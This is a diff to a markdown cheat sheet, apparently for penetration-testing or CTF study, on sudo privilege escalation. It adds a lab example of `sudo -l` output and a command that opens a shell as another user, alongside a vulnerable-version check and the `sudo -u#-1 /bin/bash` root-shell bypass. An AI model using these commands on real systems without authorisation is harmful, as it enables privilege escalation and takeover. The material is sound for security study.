@@ -13,7 +13,7 @@ ___
 <!-- Commands {{{-->
 ## Commands
 
-Check which commands the current user may run
+Enumerate commands the current user may run
 
 <!-- Tip {{{-->
 > [!tip]
@@ -30,19 +30,49 @@ Execute a command as another user
 sudo -l
 ```
 
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> www-data@bashed:/home/arrexel# sudo -l
+> ```
+> ```sh
+> Matching Defaults entries for www-data on bashed:
+> env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+>
+> User www-data may run the following commands on bashed:
+> (scriptmanager : scriptmanager) NOPASSWD: ALL
+> ```
+>
+> Run any command as `scriptmanager` via `sudo`, without a password
+<!-- }}} -->
+
 [sudo](https://man7.org/linux/man-pages/man8/sudo.8.html) —
 Run command as specified user
 
 ```sh
 sudo -u <user> /bin/echo Hello World!
 ```
+
+```sh
+sudo -u <user> bash
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> sudo -u scriptmanager /bin/echo Hello World!
+> ```
+<!-- }}} -->
+
 ___
 <!-- }}} -->
 
 <!-- Version {{{-->
 ## Version
 
-Check `sudo` version
+Enumerate `sudo` version
 
 ```sh
 sudo --version
@@ -56,7 +86,7 @@ sudo -V
 sudo -V | head -n1
 ```
 
-Check if `sudo` version is in a vulnerable range
+Enumerate if `sudo` version is in a vulnerable range
 
 ```sh
 if sudo -V 2>/dev/null | grep -Eq 'Sudo ver 1\.[0-7]\.[0-9]+|1\.8\.1[0-9]|1\.8\.2[0-7]'; then
@@ -89,7 +119,7 @@ can bypass certain policy blacklists and session PAM modules, and can cause inco
 sudo -u#-1 /bin/bash
 ```
 
-1. Check which command(s) the user can run as `sudo`
+1. Enumerate which command(s) the user can run as `sudo`
 
 ```sh
 sudo -l
